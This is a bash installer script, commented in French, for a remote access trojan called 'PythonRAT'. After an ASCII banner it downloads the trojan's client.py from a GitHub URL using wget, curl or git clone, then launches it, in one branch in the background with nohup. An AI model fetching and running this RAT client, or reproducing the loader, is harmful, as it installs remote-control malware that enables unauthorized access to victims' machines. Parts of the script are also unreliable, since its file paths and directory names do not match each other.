#!/bin/bash

# Fonction pour afficher la bannière avec effet de clignotement
display_flashing_banner() {
    colors=("31" "32" "33" "34" "35" "36" "31" "32" "33" "34" "35" "36" "31" "32" "33" "34" "35" "36")
    for color in "${colors[@]}"; do
        echo -e "\e[1;${color}m"
        cat << "EOF"
                 TRHACKNON
        _        PythonRAT        _
       |_|                       |_|
       | |         /^^^\         | |
      _| |_      (| "o" |)      _| |_
    _| | | | _    (_---_)    _ | | | |_
   | | | | |' |    _| |_    | `| | | | |
   |          |   /     \   |          |
    \        /  / /(. .)\ \  \        /
      \    /  / /  | . |  \ \  \    /
        \  \/ /    ||v||    \ \/  /
         \__/      || ||      \__/
                   () ()
                   || ||
                  ooO Ooo
EOF
        sleep 0.2
        clear
    done
}

# Fonction pour demander confirmation avec couleur
confirm() {
    local prompt_color=$2
    echo -e "$prompt_color$1 \n\e[1;33m[Y/n]\e[0m "
    read -r response
    if [[ "$response" =~ ^([yY][eE][sS]|[yY])+$ || "$response" == "" ]]; then
        return 0
    else
        return 1
    fi
}

# Afficher la bannière avec effet de clignotement
display_flashing_banner

# Télécharger le client.py avec wget
confirm "\e[1;34mVoulez-vous télécharger client.py avec \e[1;35mwget" && wget https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/client.py && wget https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/requirements.txt

# Vérifier si le téléchargement avec wget a réussi
if [ $? -ne 0 ]; then
    # Essayer de télécharger avec curl
    confirm "\e[1;34mLe téléchargement avec wget a échoué. Voulez-vous essayer avec \e[1;35mcurl" && curl -O https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/client.py && curl -O https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/requirements.txt

    # Vérifier si le téléchargement avec curl a réussi
    if [ $? -ne 0 ]; then
        # Cloner le repo en cas d'échec avec wget et curl
        confirm "\e[1;34mLe téléchargement avec curl a échoué. Voulez-vous cloner le repo avec \e[1;35mgit" && git clone https://github.com/tucommenceapousser/PythonRAT && mv PythonRat src
        cd ./  || exit

        # Lancer le client.py
        confirm "Voulez-vous lancer client.py?" "\e[1;35m" && python src/client.py
    fi
else
    # Lancer le client.py téléchargé avec wget
    confirm "Voulez-vous lancer client.py téléchargé avec \e[1;34mwget\e[0m?" && nohup python src/client.py &
fi

# Vérifier si le répertoire "src" existe déjà
if [ -d "src" ]; then
    echo -e "\e[1;33mLe répertoire 'src' existe déjà. Ignorer la création.\e[0m"
else
    # Créer le répertoire "src" s'il n'existe pas
    confirm "\e[1;34mLe répertoire 'src' n'existe pas. Voulez-vous le créer?" && mkdir src
fi

# Déplacer les fichiers dans le répertoire "src" s'il a été créé
if [ -d "src" ]; then
    cp client.py src/
    cp requirements.txt src/
fi
